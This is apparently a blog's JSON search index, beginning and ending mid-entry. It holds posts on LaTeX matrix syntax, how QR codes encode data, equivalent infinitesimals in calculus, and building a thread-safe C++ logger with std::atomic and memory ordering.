as:\\[\\begin{matrix}1&amp;0&amp;0\\\\0&amp;1&amp;0\\\\0&amp;0&amp;1\\\\\\end{matrix}\\]\\begin{bmatrix}{a_{11}}&amp;{a_{12}}&amp;{\\cdots}&amp;{a_{1n}}\\\\{a_{21}}&amp;{a_{22}}&amp;{\\cdots}&amp;{a_{2n}}\\\\{\\vdots}&amp;{\\vdots}&amp;{\\ddots}&amp;{\\vdots}\\\\{a_{m1}}&amp;{a_{m2}}&amp;{\\cdots}&amp;{a_{mn}}\\\\\\end{bmatrix}rendered as:\\[\\begin{bmatrix}{a_{11}}&amp;{a_{12}}&amp;{\\cdots}&amp;{a_{1n}}\\\\{a_{21}}&amp;{a_{22}}&amp;{\\cdots}&amp;{a_{2n}}\\\\{\\vdots}&amp;{\\vdots}&amp;{\\ddots}&amp;{\\vdots}\\\\{a_{m1}}&amp;{a_{m2}}&amp;{\\cdots}&amp;{a_{mn}}\\\\\\end{bmatrix}\\]Simultaneous EquationsStart with \\begin{cases}, end with \\end{cases}For example:\\begin{cases}a_1x+b_1y+c_1z=d_1\\\\a_2x+b_2y+c_2z=d_2\\\\a_3x+b_3y+c_3z=d_3\\\\\\end{cases}rendered as:\\[\\begin{cases}a_1x+b_1y+c_1z=d_1\\\\a_2x+b_2y+c_2z=d_2\\\\a_3x+b_3y+c_3z=d_3\\\\\\end{cases}\\]TagsFor example: a_1x+b_1y+c_1z=d_1 \\tag{1} is rendered as:\\[a_1x+b_1y+c_1z=d_1 \\tag{1}\\]Spaces  LaTeX syntax ignores spaces and requires the escape character \\ . \\quad  represents four spaces."
  },
  
  {
    "title": "How do QR Codes Work - Overview of the QR Code",
    "url": "/posts/qrcode/",
    "categories": "CS",
    "tags": "QR-codes, CS",
    "date": "2025-01-25 00:00:00 +0900",
    





    
    "snippet": "About QR codeA QR code, quick-response code, is a type of two-dimensional matrix barcode invented in 1994 by Masahiro Hara of Japanese company Denso Wave for labelling automobile parts. It features...",
    "content": "About QR codeA QR code, quick-response code, is a type of two-dimensional matrix barcode invented in 1994 by Masahiro Hara of Japanese company Denso Wave for labelling automobile parts. It features black squares on a white background with fiducial markers, readable by imaging devices like cameras, and processed using Reed-Solomon error correction until the image can be appropriately interpreted. The required data is then extracted from patterns that are present in both the horizontal and the vertical components of the QR image.version 40 qrcode: Bobmath and authors of wiki:QRcodeSimply put, QR codes are essentially encoded forms for strings, which are ultimately converted into binary code. Various auxiliary and error correction information is added to this code.There are a total of 40 verisons of QR codes, each version corresponds to a different size. Version 1 is a 21x21 matrix. As the version number increases by one, the length and width of the matrix becomes larger by 4.\\[(Version - 1) \\times 4 + 21\\]Structurefrom Bobmath and authors of wiki:QRcodeThere are 3 finder patterns (also called Position Markers) in total, which are used to determine the position of the QR code, so that no matter what direction we scan the code, scanners can locate and recognize which side should face up accurately, also at high speed. It is a fixed size pattern.There are always a white bar of width 1 around the finder patterns called separator, which helps the scanner distinguish between finder patterns and the actual data.from Fast Adaptive Binarization of QR Code Images for Automatic Sorting in Logistics SystemsThe alignment patterns are smaller than finder patterns. They help the scanner determine the orientation of the QR Code. This makes it possible to scan a QR Code at any angle.Different versions have different numbers of alignment patterns and their locations are also different.Timing patterns are a series of alternating black and white blocks that run through the QR code’s rows and columns. These patterns help in determining the scanning speed and facilitate the correct interpretation of the QR code data.Format information patterns contain information about the error correction and the data mask pattern and make it easier to scan the code.Format information stores error correction level and mask patternVersion information patterns are only available in versions &gt;= 7 and represents the version number.Data and error correction keys refers to the section that stores the actual data intended to be read, alongside additional encoded information used to correct errors if parts of the code are damaged or unreadable, allowing the scanner to still decode the data even with partial information missing; essentially, it’s the primary area where both the data itself and its error correction mechanisms are embedded together.QR codes allow users to choose different levels of error correction (L, M, Q, H) depending on how much damage is expected, with higher levels providing more redundancy but potentially requiring a larger code area.            Levels      Capability                  L(Low)      Recovers 7% of data              M(Medium)      Recovers 15% of data              Q(Quartile)      Recovers 25% of data              H(High)      Recovers 30% of data      Input ModeQR code input mode is the storage type that determines how much data a QR code can hold. The mode is indicated in the QR code’s version information field. Generally, it can be either numeric, alphanumeric, binary, or kanji. A second kanji mode called Extended Channel Interpretation (ECI) mode can specify the kanji character set UTF-8. However, some newer QR code readers will not be able to read this character set.Numeric modeStores numbers from 0-9. This mode is the most efficient and can store up to 7,089 characters.Alphanumeric modeStores numbers from 0-9, uppercase letters A-Z, and symbols like $, %, *, +, -, ., /, and :. This mode can store up to 4,296 characters.Byte modeStores characters from the ISO-8859-1 character set. This mode can store up to 2,953 characters.Kanji modeStores double-byte characters from the Shift JIS character set. This is the original mode developed by Denso Wave. However, it has since become the least effective, with only 1,817 characters available for storage.  There are two additional modes which are modifications of the other types:      Structured Append mode encodes data across multiple QR codes, allowing up to 16 QR codes at once.    FNC1 mode allows QR codes to incorporate GS1 barcode functionality.  Upper LimitThere is an upper limit on the data capacity of QR codes. A Version-40 QR code has the highest capacity.            Input Mode      Max. characters      Bits/char.                  Numeric      7089 characters      10/3              Alphanumeric      4296 characters      11/2              Binary      2953 characters      8              Kanji      1817 characters      13      Mode IndicatorEach input mode has a 4-bit mode indicator that identifies it. The encoded data must start with the appropriate mode indicator that specifies the mode being used for the bits that come after it.            Input Mode      Indicator                  Numeric      0001              Alphanumeric      0010              Byte      0100              Kanji      1000/0111(for ECI)              FNC1 in first position      0101(first)/1001(second position)              Structured append      0011              End of message (Terminator)      0000      Input modes can be mixed as needed within a QR code:[Mode Indicator][bitstream] --&gt; [Mode Indicator][bitstream] --&gt; etc... --&gt; [0000(Terminator)]Character Count IndicatorCharacter count indicator represents the number of characters that are encoded. It must be placed after the mode indicator.Character count indicator has a specific bit length, depending on the QR code version and encoding mode:            Input Mode      Versions 1~9      Versions 10~26      Versions 27~40                  Numeric      10 bits      12 bits      14 bits              Alphanumeric      9 bits      11 bits      13 bits              Byte      8 bits      16 bits      16 bits              Kanji      8 bits      10 bits      12 bits      EncodeingNumeric encodingTo encode a numeric string in numeric mode, first split the string into groups of three. If the length of the string is not a multiple of 3, the last set of numbers will only be one or two digits. Add zeroes in front to form a group of three digits.20250126 –&gt; 202 501 026Convert each group of numbers to binary:202 –&gt; 0011 0010 10501 –&gt; 0111 1101 01026 –&gt; 0011 010Three-digit number is converted into 10 binary bits. The group starting with one zero should be converted into 7 binary bits, and if there are two zeroes at the beginning of a group, it should be converted into 4 binary bits.Together with the mode and character count indicators, the final result is:0001 0000001000 0011001010 0111110101 0011010Alphanumeric encodingUnlike the numeric encoding, the character encoding groups characters into pairs.HE, LL, O , WO, RL, DEach alphanumeric character is represented by a number according to the Alphanumeric Table:            0 0      A 10      K 20      U 30      + 40              1 1      B 11      L 21      V 31      - 41              2 2      C 12      M 22      W 32      . 42              3 3      D 13      N 23      X 33      / 43              4 4      E 14      O 24      Y 34      : 44              5 5      F 15      P 25      Z 35                     6 6      G 16      Q 26      (space)  36                     7 7      H 17      R 27      $ 37                     8 8      I 18      S 28      % 38                     9 9      J 19      T 29      * 39             For each pair of characters, get the number representation of the first character and multiply it by 45. Then add it to the number representation of the second character. Convert the result number into an 11-bit binary string. The representation of the final character will be converted into a 6-bit binary string.H –&gt; 17E –&gt; 14\\[17 \\times 45 + 14 = 779\\]779 –&gt; 01100001011Together with the mode and character count indicators, the final result is:0010 000001011 01100001011 01111000110 10001011100 10110111000 10011010100 001101Byte encodingThe default character set for byte mode is ISO 8859-1, firstly, the text should be converted to this character set. If the text has characters that cannot be encoded in ISO 8859-1, you can use UTF-8 encoding, as some QR code readers are able to detect and display UTF-8 encoding correctly in byte mode.After converting the text string to ISO 8859-1 or UTF-8, the string needs to be split into 8-bit bytes. Then, convert the byte into an 8-bit binary string.H –&gt; 0x48 –&gt; 01001000e –&gt; 0x65 –&gt; 01100101l –&gt; 0x6c –&gt; 01101100l –&gt; 0x6c –&gt; 01101100o –&gt; 0x6f –&gt; 01101111, –&gt; 0x2c –&gt; 00101100–&gt; 0x20 –&gt; 00100000w –&gt; 0x77 –&gt; 01110111o –&gt; 0x6f –&gt; 01101111r –&gt; 0x72 –&gt; 01110010l –&gt; 0x6c –&gt; 01101100d –&gt; 0x64 –&gt; 01100100! –&gt; 0x21 –&gt; 00100001Together with the mode and character count indicators, the final result is:0100 00001101 01001000 01100101 01101100 01101100 01101111 00101100 00100000 01110111 01101111 01110010 01101100 01100100 00100001Add Pad BytesAfter obtaining a string of bits that consists of the mode indicator, the character count indicator, and the data bits, it may be necessary to add 0s and pad bytes to fill the total capacity of the QR code. After adding the terminator(0000), if the number of bits in the string is not a multiple of 8, pad the string with 0s to make the length a multiple of 8.If the string is still too short, add the following pad bytes repeatedly until the string reaches the maximum lenght:11101100 00010001The encoding result of HELLO WORLD consists of the following parts:0010  // mode indicator     000001011  // character count indicator     01100001011 01111000110 10001011100 10110111000 10011010100 001101  // data bits     0000  // terminator     00  // pad 0s     11101100 00010001 11101100  // pad bytesError CorrectionThe error correction code contains two groups, and each group contains at most two blocks. The data encoding result must be divided into up to two groups, and each group also needs to be further divided into blocks.The error correction code can be calculated based on the data encoding result, using the Reed-Solomon error correction algorithm. This algorithm is used widely, in QR codes, to resist scanning errors, in disks, to resist loss. In advanced storage systems such as Google’s GFS and BigTable, it resists data loss and reduces read latency. The finite field $\\mathbb{F}_{256}$ or $GF(2^8)$ can be implemented efficiently on computers, which means that we can implement the system based on mathematical theorems without worrying about overflowing that are usually encountered when modeling.For a given version, the total length of the data encoding and the total length of the error correction code is fixed, for example, Version-5 has 134 bytes.Regardless of data code or error correction code, take out the first byte of each block and arrange it in order, then take the second byte of each block, and so on.If the result is not enough to fill the entire data area and the error correction code area, you need to add 0s at the end.Data MaskingUneven distribution of black and white will result in large areas of white or black, making scanning and recognition difficult.To solve this problem, the QR code provides mask patterns. Before QR code is finally generated, the data bits must be XOR-ed with mask pattern. There are 8 mask pattern that available in QR code, namely mask pattern 0 to 7 (or 000 to 111 in binary). This process have a purpose of making QR code more readable by QR scanner.Eight mask patternsAfter a mask pattern has been applied to the QR matrix, it is given a penalty score based on four evaluation conditions. A QR code encoder must apply all eight mask patterns and evaluate each one. Whichever mask pattern results in the lowest penalty score is the mask pattern that must be used for the final output.ZXing-cppZXing-C++ (“zebra crossing”) is an open-source, multi-format linear/matrix barcode image processing library implemented in C++.It was originally ported from the Java ZXing Library but has been developed further and now includes many improvements in terms of runtime and detection performance. It can both read and write barcodes in a number of formats.Github Source: https://github.com/zxing-cpp/zxing-cppA very simple example looks like this:#include \"ZXing/ReadBarcode.h\"#include &lt;iostream&gt;int main(int argc, char** argv){    int width, height;    unsigned char* data;    // load your image data from somewhere. ImageFormat::Lum assumes grey scale image data.    auto image = ZXing::ImageView(data, width, height, ZXing::ImageFormat::Lum);    auto options = ZXing::ReaderOptions().setFormats(ZXing::BarcodeFormat::Any);    auto barcodes = ZXing::ReadBarcodes(image, options);    for(const auto&amp; b : barcodes){        std::cout &lt;&lt; ZXing::ToString(b.format()) &lt;&lt; \": \" &lt;&lt; b.text() &lt;&lt; \"\\n\";    }    return 0;}It also has wrappers/bindings for Android, C, iOS, Kotlin/Native, .NET, Python, Rust, WebAssembly, WinRT, Flutter (external project).Web Demos:  Read barcodes  Write barcodes  Read barcodes from camera"
  },
  
  {
    "title": "Some Simple Equivalent Infinitesimals",
    "url": "/posts/infinitesimals/",
    "categories": "Math",
    "tags": "Math",
    "date": "2025-01-02 00:00:00 +0900",
    





    
    "snippet": "When $x \\to 0$:\\[x \\sim \\sin x \\sim \\arcsin x \\sim \\tan x \\sim \\arctan x\\]\\[x \\sim (e^x - 1) \\sim \\ln(1+x)\\]\\[x \\sim \\ln(x+\\sqrt{1+x^2})\\]\\[(1-\\cos x) \\sim \\frac{1}{2}x^2\\]\\[\\log_a(1+x) \\sim \\frac{...",
    "content": "When $x \\to 0$:\\[x \\sim \\sin x \\sim \\arcsin x \\sim \\tan x \\sim \\arctan x\\]\\[x \\sim (e^x - 1) \\sim \\ln(1+x)\\]\\[x \\sim \\ln(x+\\sqrt{1+x^2})\\]\\[(1-\\cos x) \\sim \\frac{1}{2}x^2\\]\\[\\log_a(1+x) \\sim \\frac{x}{\\ln a}\\]\\[(x-\\sin x) \\sim \\frac{1}{6}x^3 \\sim (\\arcsin x - x)\\]\\[(\\tan x - x) \\sim \\frac{1}{3}x^3 \\sim (x-\\arctan x)\\]\\[(\\tan x - \\sin x) \\sim \\frac{1}{2}x^3\\]\\[a^x-1 \\sim x\\ln a\\]\\[(1+ax)^b - 1 \\sim abx\\]\\[\\left(\\sqrt[n]{1+x}-1\\right) \\sim \\frac{x}{n}\\]Legal Cases:      Multiplication: If you have a product of two infinitesimals, you can replace one of them with an equivalent infinitesimal.        Division: If you have a quotient of two infinitesimals, you can replace either the numerator or the denominator (but not both) with an equivalent infinitesimal.  Important Considerations:      Addition/Subtraction: Replacing infinitesimals in sums or differences is not generally valid.        Composition: Replacing infinitesimals within more complex functions (like compositions) can be tricky and may not always be valid.  In cases of addition/subtraction in the numerator, replacing equivalent infinitesimals is generally not legal. This is because equivalent infinitesimals only guarantee the same limiting behavior when multiplied or divided, not when added or subtracted.However, there are specific exceptions where it might be justifiable, but with careful consideration:Linear Combinations: If the numerator consists of a linear combination of equivalent infinitesimals, and the denominator has the same power as the highest power of the infinitesimals in the numerator, then replacement might be valid. This is because the linear combination can be factored, effectively reducing the problem to multiplication or division of equivalent infinitesimals.Taylor Series Approximations: If the infinitesimals are part of a Taylor series expansion, and the higher-order terms are negligible compared to the first-order term, then replacing equivalent infinitesimals in the numerator might be acceptable. This is because the higher-order terms contribute negligibly to the overall limit."
  },
  
  {
    "title": "Simple Thread-safe Logger in C++",
    "url": "/posts/logger/",
    "categories": "C/C++",
    "tags": "C/C++, Logger, Linux, Thread",
    "date": "2024-12-26 00:00:00 +0900",
    





    
    "snippet": "A thread-safe logger is crucial for the correct functioning and maintainability of multi-threaded applications. It ensures data integrity, prevents race conditions, and provides reliable log record...",
    "content": "A thread-safe logger is crucial for the correct functioning and maintainability of multi-threaded applications. It ensures data integrity, prevents race conditions, and provides reliable log records for debugging and troubleshooting. Without the thread safety, multiple threads can attempt to log message simultaneously which can lead to interleaved messages and data corruption.Thread SafetyThe std::atomic&lt;T&gt; provides an atomic type that different threads can simultaneously operate on without raising undefined behavior.Also, std::atomic&lt;T&gt; gives you more control by allowing various memory orders that specify synchronization and ordering constraints.Simple multi-threaded data accessIn a multi-threaded scenario, we have int A=B=0;.In thread-1:A = 1;print(A);In thread-2:B = 2;print(B);Execute in sequenceThe simplest case is the two threads execute in sequence, that is, after one thread completes execution, the instructions of the other thread are executed. In this case, there are two possibilities:A = 1;print(A);B = 2;print(B);The output will be: 01B = 2;print(B);A = 1;print(A);The output will be: 02Execute alternatelyA = 1;B = 2;print(A);print(B);In this case, it will print 12A = 1;B = 2;print(B);print(A);The output will be 21print 00In addition to the above cases, there is another possibility of printing 00, but this kind of output is unlikely to occur under normal circumstances.Happen-before RuleThe happens-before rule is a set of rules that define the order and visibility of actions in a program, especially in multi-threaded applications. This happens-before relationship ensures that there is a consistent order among operations. If operation A happens-before B, then the memory effects of A effectively become visible to the thread performing B before B is performed.If we want an output of “00”, the operation print(A); must happen-before A = 1;. Samely, the operation print(B) should happen-before B = 2;.However, the order of execution must be in the program order. Obviously, it is impossible to print “00”.C++ Memory orderingMemory order can be specified using the following enumeration:namespace std{    typedef enum memory_order{        memory_order_relaxed,        memory_order_consume,        memory_order_acquire,        memory_order_release,        memory_order_acq_rel,        memory_order_seq_cst    }memory_order; }The default for atomic variables is memory_order_seq_cst.      memory_order_seq_cst: A load operation with this memory order performs an acquire operation, a store performs a release operation, and read-modify-write performs both an acquire operation and a release operation        memory_order_acq_rel: A read-modify-write operation with this memory order is both an acquire operation and a release operation. No memory reads or writes in the current thread can be reordered before the load, nor after the store. All writes in other threads that release the same atomic variable are visible before the modification and the modification is visible in other threads that acquire the same atomic variable        memory_order_relaxed: No synchronization or ordering constraints imposed on other reads or writes, only this operation’s atomicity is guaranteed        memory_order_consume: A load operation with this memory order performs a consume operation on the affected memory location: no reads or writes in the current thread dependent on the value currently loaded can be reordered before this load. Writes to data-dependent variables in other threads that release the same atomic variable are visible in the current thread. On most platforms, this affects compiler optimizations only        memory_order_acquire: A load operation with this memory order performs the acquire operation on the affected memory location: no reads or writes in the current thread can be reordered before this load. All writes in other threads that release the same atomic variable are visible in the current thread        memory_order_release: A store operation with this memory order performs the release operation: no reads or writes in the current thread can be reordered after this store. All writes in the current thread are visible in other threads that acquire the same atomic variable (see Release-Acquire ordering below) and writes that carry a dependency into the atomic variable become visible in other threads that consume the same atomic  Sequential ConsistencySequential Consistency(SC) is the simplest memory order.  “… the result of any execution is the same as if the operations of all the processors were executed in some sequential order, and the operations of each individual processor appear in this sequence in the order specified by its program.”    – Leslie Lamport, “How to Make a Multiprocessor Computer That Correctly Executes Multiprocess Programs”, IEEE Trans. Comput. C-28,9 (Sept. 1979), 690-691.In summary, it follows two rules:      The execution order of each processor is the same as the program order.        All processors can only see one single order of execution.  When we add write cache to the core, some situations that are impossible under SC model become possible. It is called the Total Store Ordering.We still use the example mentioned above:In thread-1:A = 1;print(A);In thread-2:B = 2;print(B);This time, threads write the new values of A and B into the cache and then returns immediately. It has not been updated to the memory yet. When the print(); is called, the proccessor can only access the origin values of A and B, so the output can be 00.Relaxed Memory ModelsNeither of the above two memory models(SC &amp; TSO) changes the order of execution when a sigle thread executes. However the Relaxed Memory Model to be discussed here changes the order.In the relaxed memory models, instructions can be reordered by the compiler while satisfying the final result of the single thread.For a simple example, we use gcc to generate the assembly code of following code:int A, B;void func(){  A = B + 1;  B = 0;}int main(){  func();  return 0;}gcc test.c -SThe test.s will be like:    .file    \"test.cpp\"    .text    .globl    A    .bss    .align 4    .type    A, @object    .size    A, 4A:    .zero    4    .globl    B    .align 4    .type    B, @object    .size    B, 4B:    .zero    4    .text    .globl    _Z4funcv    .type    _Z4funcv, @function_Z4funcv:.LFB0:    .cfi_startproc    pushq    %rbp    .cfi_def_cfa_offset 16    .cfi_offset 6, -16    movq    %rsp, %rbp    .cfi_def_cfa_register 6    movl    B(%rip), %eax    addl    $1, %eax    movl    %eax, A(%rip)    movl    $0, B(%rip)    nop    popq    %rbp    .cfi_def_cfa 7, 8    ret    .cfi_endproc.LFE0:    .size    _Z4funcv, .-_Z4funcv    .globl    main    .type    main, @functionmain:.LFB1:    .cfi_startproc    pushq    %rbp    .cfi_def_cfa_offset 16    .cfi_offset 6, -16    movq    %rsp, %rbp    .cfi_def_cfa_register 6    call    _Z4funcv    movl    $0, %eax    popq    %rbp    .cfi_def_cfa 7, 8    ret    .cfi_endproc.LFE1:    .size    main, .-main    .ident    \"GCC: (Debian 14.2.0-8) 14.2.0\"    .section    .note.GNU-stack,\"\",@progbitsLet’s make it simple and focus only on the following instructions:movl    B(%rip), %eaxaddl    $1, %eaxmovl    %eax, A(%rip)movl    $0, B(%rip)In these four lines of instructions, B will be firstly assigned to register eax, then the 1-added eax is assigned to A, finally set B to 0.If we add -O2 to optimize(gcc test.c -S -O2), the assembly code will be different:movl    B(%rip), %eaxmovl    $0, B(%rip)addl    $1, %eaxmovl    %eax, A(%rip)After assigning to eax, the B is immediately set to 1.This shows that as long as the B is temporarily stored, the movl operations can be reordered without changing the final execution result.std::atomicIn multi-threaded programming, synchronization problems between threads are unavoidable. Traditional synchronization methods, such as mutex and condition variables, may lead to performance degradation and deadlocks. C++11 introduces atomic operations, providing a more efficient and safe multi-threaded programming method. This article will introduce the concept, usage and examples of atomic operations in C++.std::atomic_flagstd::atomic_flag is the simplest atomic type, with only two states: set and clear. std::atomic_flag cannot be copied and assigned, and must be initialized using the ATOMIC_FLAG_INIT macro.#include &lt;iostream&gt;#include &lt;atomic&gt;using namespace std;int main(){  std::atomic_flag flag = ATOMIC_FLAG_INIT;  cout &lt;&lt; flag.test_and_set() &lt;&lt; endl;  cout &lt;&lt; flag.test_and_set() &lt;&lt; endl;  cout &lt;&lt; endl;  flag.clear();  return 0;}Think of flag as a boolean. Through this example, we found that test_and_set() can actually be regarded as two actions: test the flag first, that is, get the current status of flag as the return value, and then set it to true. These two actions cannot be interrupted in the middle. clear() sets flag to false.std::atomicstd::atomic is a general atomic type that can be used for any copyable type T. std::atomic can be initialized using the default constructor, copy constructor or assignment operation.std::atomic&lt;int&gt; atomicInt(0);std::atomic&lt;bool&gt; atomicBool(true);atomic operationsBasic atomic operations include load(), store(), exchange(), etc. load() can be used to read the value of an atomic variable, store() is used to set the value and the exchange() function atomically replaces the current value of an atomic variable with a new value and returns the old value.#include &lt;atomic&gt;#include &lt;iostream&gt;int main(){    std::atomic&lt;int&gt; atomicInt(0);    int value = atomicInt.load();    // get value    std::cout &lt;&lt; \"value: \" &lt;&lt; value &lt;&lt; std::endl;    atomicInt.store(1);    // set value    std::cout &lt;&lt; \"value: \" &lt;&lt; atomicInt.load() &lt;&lt; std::endl;    int old_value = atomicInt.exchange(2);    std::cout &lt;&lt; \"old_value: \" &lt;&lt; old_value &lt;&lt; \", new_value: \" &lt;&lt; atomicInt.load() &lt;&lt; std::endl;    return 0;}Some simple arithmetic operations are atomically implemented by fetch_add, fetch_sub, fetch_and, fetch_or, fetch_xor and etc.std::atomic&lt;int&gt; counter(0);counter.fetch_add(1);counter.fetch_sub(1);In computer science, compare-and-swap (CAS) is an atomic instruction used in multithreading to achieve synchronization. std::atomic also offers simple CAS supports like compare_exchange_weak and compare_exchange_strong. CAS contains an expected value and a new value, by comparing the current value with the expected value, CAS returns a boolean to tell whether the two values are the same. If they are the same, the new value will be stored, otherwise, the expected value will be set to the current value.#include &lt;atomic&gt;#include &lt;iostream&gt;int main(){    std::atomic&lt;int&gt; atomicInt(0);    int expected = 0;    bool success = atomicInt.compare_exchange_weak(expected, 10);    std::cout &lt;&lt; \"success: \" &lt;&lt; success               &lt;&lt; \", expected: \" &lt;&lt; expected              &lt;&lt; \", value: \" &lt;&lt; atomicInt.load()               &lt;&lt; std::endl;    expected = 0;    success = atomicInt.compare_exchange_strong(expected, 20);    std::cout &lt;&lt; \"success: \" &lt;&lt; success               &lt;&lt; \", expected: \" &lt;&lt; expected               &lt;&lt; \", value: \" &lt;&lt; atomicInt.load()               &lt;&lt; std::endl;    return 0;}The key difference between compare_exchange_strong and compare_exchange_weak lies in their behavior regarding spurious failures. compare_exchange_weak may fail spuriously and compare_exchange_strong guarantees no spurious failures. Use compare_exchange_weak when efficiency is critical and you can tolerate the possibility of spurious failures or you can easily handle spurious failures in the code.SpinLock with std::atomicclass SpinLock{public:    SpinLock(std::atomic_flag&amp; flag) : flag(flag){        while(flag.test_and_set(std::memory_order_acquire));    }    ~SpinLock(){        flag.clear(std::memory_order_release);    }private:    std::atomic_flag&amp; flag;};std::atomic_flag flag;SpinLock spinlock(flag);Right-Value ReferencesMoving objects is generally much faster than copying them, especially for large objects or objects with complex internal structures.A right-value reference is a special kind of reference that can only bind to rvalues.The primary purpose of right-value references is to enable move semantics.Move semantics allows efficient transfer of resources (like memory) from one object to another without the need for expensive copying operations.When an object is moved, its resources are transferred to the new object, leaving the original object in a valid but unspecified state 1 (often empty).WIth the help of Right-Value references, we can implement a perfect forwarding:#include &lt;iostream&gt;template &lt;typename T&gt;void forward_function(T&amp;&amp; param) {    func(std::forward&lt;T&gt;(param));    // perfect forward to func}int main() {    int x = 10;    forward_function(x);    forward_function(std::move(x));}Queue BufferBufferBase is an abstracted base class defined some basic operations of a buffer. push(LogLine&amp;&amp; logline) pushes a log line to the buffer and pop(LogLine&amp; logline) popes it out. Use virtual destructors to ensure that derived classes are destructed correctly.class BufferBase{public:    virtual ~BufferBase() = default;    virtual void push(LogLine&amp;&amp; logline) = 0;    virtual bool pop(LogLine&amp; logline) = 0;};Buffer is based on BufferBase and implements specific buffer functions. Item is used to store log lines. Each item has a char padding contains 256 padding bytes to ensure memory alignment.write_state records the state of each position.static constexpr const size_t size = 32768; defines the limit of this buffer(4 * 8 * 1024).During the initialization phase, only the current thread is accessing the write_state array. There is no situation where multiple threads are accessing the same memory location at the same time, in this condition, memory_order_relaxed offers a more efficient way to initialize the write_data. Although a relaxed model is used, it does not mean that there is no order guarantee at all. Within the same thread, these initialization operations will still be executed in program order.The  memory_order_acquire ensures that before executing this atomic operation, all previous read and write operations have completed and are visible to subsequent read operations. Which means, before the fetch_add operation is executed, the write operations to other positions in the write_state have been completed and are visible to subsequent read operations.Copy constructor and assignment operator are disabled to avoid possible memory problems.class Buffer{public:    struct Item{        char padding[256 - sizeof(LogLine)];        LogLine logline;        Item(LogLine&amp;&amp; logline) : logline(std::move(logline)){}    };    static constexpr const size_t size = 32768;    Buffer() : items(static_cast&lt;Item*&gt;(std::malloc(size * sizeof(Item)))){        for(size_t i = 0; i &lt;= size; i++)   write_state[i].store(0, std::memory_order_relaxed);        static_assert(sizeof(Item) == 256);    }    ~Buffer(){        unsigned int write_cnt = write_state[size].load();        for(size_t i = 0; i &lt; write_cnt; i++)   items[i].~Item();        std::free(items);    }    bool push(LogLine&amp;&amp; logline, const unsigned int write_index){        new(&amp;items[write_index]) Item(std::move(logline));        write_state[write_index].store(1, std::memory_order_release);        return write_state[size].fetch_add(1, std::memory_order_acquire) + 1 == size;    }    bool pop(LogLine&amp; logline, const unsigned int read_index){        if(write_state[read_index].load(std::memory_order_acquire)){            Item&amp; item = items[read_index];            logline = std::move(item.logline);            return true;        }        return false;    }    Buffer(const Buffer&amp;) = delete;    Buffer&amp; operator=(const Buffer&amp;) = delete;private:    Item *items;    std::atomic&lt;unsigned int&gt;write_state[size + 1]; // write_state[size]: write count};QueueBuffer offers a thread-safe queue buffer for log lines.buffers is a std::queue&lt;std::unique_ptr&lt;Buffer&gt;&gt; type used to store smart pointers of multiple Buffer objects.w_cursor points to the currently writable buffer using atomic operations.write_index is a std::atomic&lt;unsigned int&gt; type that uses atomic operations to record the write index in the current writable buffer.The create_buffer() function creates a new buffer and sets it as a writable buffer. When a thread updates w_cursor to the address of a new buffer, it wants other threads to see this update as soon as possible. std::memory_order_release ensures that all memory operations before performing this storage operation are visible to subsequent read operations. All memory operations preceding this store operation are visible to subsequent read operations. That is, when other threads read the new w_cursor value, they must also see the write to the data in next_wbuffer.class QueueBuffer : public BufferBase{public:    QueueBuffer() : r_cursor{nullptr}, write_index(0), flag{ATOMIC_FLAG_INIT}, read_index(0){        create_buffer();    }    void push(LogLine&amp;&amp; logline) override{        unsigned int windex = write_index.fetch_add(1, std::memory_order_relaxed);        if(windex &lt; Buffer::size){            if(w_cursor.load(std::memory_order_acquire) -&gt; push(std::move(logline), windex)){                create_buffer();            }        }else{            while(write_index.load(std::memory_order_acquire) &gt;= Buffer::size);            // wait until buffer is available            push(std::move(logline));        }    }    bool pop(LogLine&amp; logline) override{        if(r_cursor == nullptr)  r_cursor = get_rbuffer();        Buffer *rcursor = r_cursor; // avoid race conditions        if(rcursor == nullptr)  return false;        if(rcursor -&gt; pop(logline, read_index)){            read_index++;            if(read_index == Buffer::size){                read_index = 0;                r_cursor = nullptr;                SpinLock spinlock(flag);                buffers.pop();            }            return true;        }        return false;    }    QueueBuffer(const QueueBuffer&amp;) = delete;    QueueBuffer&amp; operator=(const QueueBuffer&amp;) = delete;    // disable copy constructorprivate:    std::queue&lt;std::unique_ptr&lt;Buffer&gt;&gt;buffers;    std::atomic&lt;Buffer*&gt;w_cursor;   //current write buffer    Buffer* r_cursor;    //current read buffer    std::atomic&lt;unsigned int&gt;write_index;    unsigned int read_index;    std::atomic_flag flag;    void create_buffer(){        std::unique_ptr&lt;Buffer&gt;next_wbuffer(new Buffer());        w_cursor.store(next_wbuffer.get(), std::memory_order_release);        SpinLock spinlock(flag);        buffers.push(std::move(next_wbuffer));        write_index.store(0, std::memory_order_relaxed);    }    Buffer* get_rbuffer(){        SpinLock spinlock(flag);        return buffers.empty() ? nullptr : buffers.front().get();    }};Logger ClassState enum defines three possible states for the logger: INIT (during initialization), ENABLED (ready to log messages), and DISABLED (shutting down).pop() is designed to run in a separate thread within the Logger class. std::memory_order_acquire is crucial here. It ensures that any memory accesses that happened before the state was set to ENABLED are visible to this thread. This prevents the pop thread from starting to process log messages before the Logger object is fully initialized (including the buffer_queue and file_writer). The second loop, while(buffer_queue -&gt; pop(logline)) file_writer.write(logline);, which runs after the state has transitioned to State::DISABLED is designed to read and write any remaining log lines that might still be present in the buffer_queue before the logger is completely shut down. This offers a graceful shutdown which ensures that no log lines are lost even if the state is changed to DISABLED while there are still messages in the buffer.class Logger{public:    Logger(const std::string&amp; dir, const std::string&amp; filename, uint32_t roll_size)      : state(State::INIT),      buffer_queue(new QueueBuffer()),      file_writer(dir, filename, std::max(1u, roll_size)),      thread(&amp;Logger::pop, this){        state.store(State::ENABLED, std::memory_order_release);    }        ~Logger(){        state.store(State::DISABLED);        thread.join();    // Waits for the thread to finish execution    }    void add(LogLine&amp;&amp; logline){        buffer_queue -&gt; push(std::move(logline));    }    void pop(){        while(state.load(std::memory_order_acquire) == State::INIT);        // wait until constructor is finished        LogLine logline(LogSeverity::INFO, nullptr, nullptr, 0);        while(state.load(std::memory_order_seq_cst) == State::ENABLED){            if(buffer_queue -&gt; pop(logline))    file_writer.write(logline);        }        // read remaining log        while(buffer_queue -&gt; pop(logline)) file_writer.write(logline);    }          private:    enum class State{        INIT,        ENABLED,        DISABLED,    };    std::atomic&lt;State&gt;state;    std::unique_ptr&lt;BufferBase&gt;buffer_queue;    FileWriter file_writer;    std::thread thread;};Init a loggerstd::unique_ptr&lt;Logger&gt;logger;std::atomic&lt;Logger*&gt;atomic_logger;void init(const std::string&amp; dir, const std::string filename, uint32_t roll_size){    logger.reset(new Logger(dir, filename, roll_size));    atomic_logger.store(logger.get(), 